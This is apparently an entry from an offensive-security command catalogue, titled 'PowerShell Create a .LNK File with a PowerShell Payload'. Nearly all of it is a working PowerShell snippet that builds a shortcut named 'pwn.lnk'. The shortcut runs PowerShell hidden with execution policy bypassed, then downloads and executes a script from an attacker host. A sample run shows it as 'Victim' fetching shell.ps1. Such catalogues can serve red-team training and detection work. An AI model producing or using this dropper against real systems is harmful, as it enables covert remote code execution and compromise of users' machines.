---
id: 3fb06e57-6cc1-4626-a765-7b0af0c42dee
name: PowerShell Create a .LNK File with a PowerShell Payload
type: command
executor: powershell
data: '$WScript = New-Object -COM WScript.shell

  $SC = $WScript.CreateShortcut(''pwn.lnk'')

  $SC.TargetPath="powershell.exe"

  $SC.Arguments="-ep bypass -windowstyle hidden iex(New-Object Net.WebClient).downloadString(''http://$_ATTACKER_IP/$_FILENAME.ps1'')"

  $SC.Save()'
output: 'PS C:\Users\Victim> $WScript = New-Object -COM WScript.shell

  PS C:\Users\Victim> $SC = $WScript.CreateShortcut(''pwn.lnk'')

  PS C:\Users\Victim> $SC.TargetPath="powershell.exe"

  PS C:\Users\Victim> $SC.Arguments="-ep bypass -windowstyle hidden iex(New-Object
  Net.WebClient).downloadString(''http://10.10.10.100/shell.ps1'')"

  PS C:\Users\Victim> $SC.Save()'
created_at: '2019-12-09T19:56:59.768700+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[Powershell]]'
- '[[ps]]'
---

# PowerShell Create a .LNK File with a PowerShell Payload

```powershell
$WScript = New-Object -COM WScript.shell
$SC = $WScript.CreateShortcut('pwn.lnk')
$SC.TargetPath="powershell.exe"
$SC.Arguments="-ep bypass -windowstyle hidden iex(New-Object Net.WebClient).downloadString('http://$_ATTACKER_IP/$_FILENAME.ps1')"
$SC.Save()
```

## Expected Output

```
PS C:\Users\Victim> $WScript = New-Object -COM WScript.shell
PS C:\Users\Victim> $SC = $WScript.CreateShortcut('pwn.lnk')
PS C:\Users\Victim> $SC.TargetPath="powershell.exe"
PS C:\Users\Victim> $SC.Arguments="-ep bypass -windowstyle hidden iex(New-Object Net.WebClient).downloadString('http://10.10.10.100/shell.ps1')"
PS C:\Users\Victim> $SC.Save()
```


